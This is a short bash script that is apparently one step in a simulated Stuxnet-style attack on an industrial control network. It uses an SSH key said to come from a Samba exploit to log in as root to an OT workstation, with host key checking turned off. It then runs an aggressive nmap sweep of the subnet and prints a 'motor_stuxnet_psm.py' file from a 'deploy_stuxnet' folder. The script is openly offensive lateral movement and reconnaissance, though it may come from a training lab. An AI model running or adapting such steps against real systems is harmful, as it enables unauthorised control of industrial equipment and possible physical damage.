#!/bin/bash 

echo "Accessing the OT workstation using the stux-key obtained from the Samba exploit..."
echo "Using the stux-key to SSH into the OT workstation at 192.168.1.5"

ssh -i /root/.ssh/stux-key -o StrictHostKeyChecking=no root@192.168.1.5 "nmap 192.168.1.0/24 -T5 && cd /scripts/workstation/stuxnet/deploy_stuxnet && cat motor_stuxnet_psm.py" 
